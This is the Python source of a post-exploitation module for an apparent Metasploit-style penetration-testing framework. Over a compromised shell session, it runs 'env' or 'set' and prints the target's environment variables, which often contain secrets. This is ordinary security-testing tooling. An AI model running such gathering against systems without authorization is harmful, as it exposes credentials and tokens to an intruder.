"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/post/multi/gather/env.py
"""

from teralibs.tsf.base.post import PLATFORM_LINUX, PLATFORM_UNIX, PLATFORM_WINDOWS, Post


class TerasploitModule(Post):
    """
    Dump the remote environment via the active shell session.

    Runs the platform-appropriate command (``env`` on UNIX-like targets,
    ``set`` on Windows) and prints each variable to the console.  The
    SESSION option is supplied automatically by the framework when a post
    module is loaded - set it to the ID of an open session before running.
    """

    NAME = "Multi Gather Environment Variables"
    DESCRIPTION = (
        "Collect environment variables from the active shell session. "
        "Works against UNIX (env) and Windows (set) targets."
    )
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.0"
    RANK = "normal"
    REFERENCES = ["MSF - post/multi/gather/env"]

    PLATFORM = [PLATFORM_LINUX, PLATFORM_UNIX, PLATFORM_WINDOWS]
    SESSION_TYPES = ["shell"]

    # Platform-to-command mapping.  Windows shells use ``set``;
    # everything else uses ``env``.
    CMD = {
        "windows": "set",
    }
    CMD_DEFAULT = "env"

    def run(self, ctx):
        """Dump the environment to the console."""

        platform = ctx.session.platform.lower()
        cmd = self.CMD.get(platform, self.CMD_DEFAULT)

        ctx.info(f"Gathering environment variables via '{cmd}' ...")

        try:
            ctx.session.send_command(cmd)
            output = ctx.session.read_output(timeout=10.0)
        except RuntimeError as exc:
            ctx.error(f"Session error: {exc}")
            return

        if not output.strip():
            ctx.warning("No output received - session may be unresponsive.")
            return

        ctx.success("Environment variables:")
        for line in output.splitlines():
            line = line.strip()
            if line:
                ctx.info(f"  {line}")
